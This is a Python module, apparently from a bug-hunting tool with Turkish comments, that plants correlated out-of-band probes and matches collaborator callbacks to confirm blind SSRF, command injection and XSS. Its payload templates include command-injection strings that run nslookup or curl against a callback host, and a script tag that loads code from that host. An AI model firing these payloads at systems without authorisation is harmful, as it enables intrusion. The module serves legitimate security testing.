"""OOB / OAST — KÖR (blind) zafiyet tespiti için out-of-band etkileşim.

DELTA-engine'in self-hosted OOB sunucusu fikrinden uyarlandı — ama bugtool KENDİ sunucusunu
ÇALIŞTIRMAZ (o ağır iş). Bunun yerine senin collaborator'ına (interactsh / Burp Collaborator)
benzersiz, KORELE token'lı problar gömer: `http://TOKEN.senin-domainin/`. Hedef sunucu o
token'lı adrese bir istek atarsa (DNS ya da HTTP), bu KÖR bir SSRF/CMDi/XSS'i kanıtlar —
cevap gövdesinde hiçbir yansıma olmasa bile (klasik in-band tespitin göremediği sınıf).

Akış:
  1. `plant()` — her (url, param, sınıf) için token üret, payload'a göm, token→bağlam kaydet.
  2. Tarama biter; sen collaborator panelinde gelen callback'lerin token'larını görürsün
     (ya da interactsh-client çıktısını bir dosyaya alırsın).
  3. `correlate(hit_token'lar)` — hangi prob'un ateşlediğini eşleştirir → KANITLANMIŞ kör bulgu.

Token deterministik (rand YOK — DELTA PD2): mint(seed, seq) = base32(blake2b). Aynı girdi →
aynı token → tekrar üretilebilir/replay edilebilir. Ağ bu modülde YOK (fuzzer gönderir).
"""

import base64
import hashlib
import json
import os
from typing import Any, Dict, List, Optional

# Her sınıf için OOB payload şablonları. `{H}` = token.domain ile doldurulur.
# Kör SSRF: sunucu URL'i fetch ederse callback. Kör CMDi: OS komutu DNS/HTTP çıkışı yapar.
# Kör XSS: kurban tarayıcıda script yüklenirse callback (stored/DOM XSS).
_TEMPLATES: Dict[str, List[str]] = {
    "blind_ssrf": ["http://{H}/", "//{H}/"],
    "blind_cmdi": [";nslookup {H}", "|nslookup {H}", "$(curl http://{H}/)", "`curl http://{H}/`"],
    "blind_xss": ['"><script src=//{H}></script>'],
}

_SEVERITY = {"blind_ssrf": "high", "blind_cmdi": "critical", "blind_xss": "high"}


def mint_token(seed: str, seq: int) -> str:
    """Deterministik, DNS-label-güvenli token (16 base32 char = 80 bit). rand/clock YOK."""
    h = hashlib.blake2b(f"{seed}:{seq}".encode("utf-8"), digest_size=10).digest()
    return base64.b32encode(h).decode("ascii").lower().rstrip("=")


class OobManager:
    """Korele OOB prob üretici + prob deposu + callback eşleştirici."""

    def __init__(self, domain: str, seed: str = "bugtool"):
        self.domain = domain.strip().lstrip(".")
        self.seed = seed
        self.seq = 0
        self.probes: Dict[str, Dict[str, Any]] = {}   # token -> {class, url, param, payload}

    @staticmethod
    def templates() -> Dict[str, List[str]]:
        return _TEMPLATES

    def plant(self, cls: str, url: str, param: str, template: str) -> tuple:
        """Bir prob üretir: token mint et, payload'a göm, bağlamı kaydet.
        Döner: (token, gömülmüş payload)."""
        self.seq += 1
        token = mint_token(self.seed, self.seq)
        host = f"{token}.{self.domain}"
        payload = template.replace("{H}", host)
        self.probes[token] = {"class": cls, "url": url, "param": param,
                              "payload": payload, "host": host}
        return token, payload

    def correlate(self, hit_tokens: List[str]) -> List[Dict[str, Any]]:
        """Collaborator'dan gelen callback token'larını gömülü problarla eşleştirir.
        Bir hit satırı tam token'ı ya da token'ı İÇEREN bir string (örn. tam DNS adı)
        olabilir. Eşleşen her prob → KANITLANMIŞ kör bulgu."""
        out: List[Dict[str, Any]] = []
        matched = set()
        for hit in hit_tokens:
            h = (hit or "").strip().lower()
            if not h:
                continue
            for token, ctx in self.probes.items():
                if token in matched:
                    continue
                if token in h:
                    matched.add(token)
                    out.append(self._finding(token, ctx))
        return out

    def _finding(self, token: str, ctx: Dict[str, Any]) -> Dict[str, Any]:
        cls = ctx["class"]
        return {
            "class": cls,
            "severity": _SEVERITY.get(cls, "high"),
            "confidence": "high",
            "verdict": "fired",
            "url": ctx["url"],
            "param": ctx["param"],
            "payload": ctx["payload"],
            "evidence": f"OOB callback alındı: {ctx['host']} (token {token}) — kör etkileşim kanıtlandı",
            "reproduction": ctx["payload"],
            "status": "confirmed_oob",
            "note": "KANITLANDI (OOB) — hedef sunucu senin collaborator'ına gerçekten "
                    "istek attı. Kör " + cls.replace("blind_", "").upper() + ".",
        }

    # ── Kalıcılık (prob deposu) ──────────────────────────────────────────────
    def save(self, path: str):
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"domain": self.domain, "seed": self.seed,
                       "seq": self.seq, "probes": self.probes},
                      f, indent=2, ensure_ascii=False)

    @classmethod
    def load(cls, path: str) -> Optional["OobManager"]:
        if not os.path.exists(path):
            return None
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except (OSError, ValueError):
            return None
        m = cls(data.get("domain", ""), data.get("seed", "bugtool"))
        m.seq = int(data.get("seq", 0))
        m.probes = data.get("probes", {}) or {}
        return m


def read_hit_tokens(path: str) -> List[str]:
    """Bir dosyadan callback token/satırlarını okur (interactsh-client çıktısı, ya da
    collaborator'dan elle kopyaladığın DNS/HTTP isimleri — her satır bir hit)."""
    if not os.path.exists(path):
        return []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except OSError:
        return []
